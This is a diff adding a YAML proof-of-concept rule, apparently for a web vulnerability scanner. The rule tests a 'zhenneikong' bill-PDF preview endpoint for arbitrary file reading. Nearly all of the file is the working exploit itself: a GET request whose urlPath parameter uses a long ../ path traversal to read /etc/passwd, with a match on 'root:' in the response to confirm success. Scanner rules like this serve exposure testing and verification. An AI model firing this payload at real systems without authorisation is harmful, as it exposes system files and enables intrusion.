@@ -1,0 +1,21 @@
+name: poc-yaml-zhenneikong-preview-File-reading
+transport: http
+
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /print/billPdf/preview?urlPath=../../../../../../../../../../../../../../etc/passwd
+      headers:
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
+
+    expression: response.status == 200 && response.body.bcontains(b'root:')
+
+expression: r0() 
+
+
+detail:
+  author: Superhero
+  links:
+    - https://superhero.blog.csdn.net/article/details/139842187
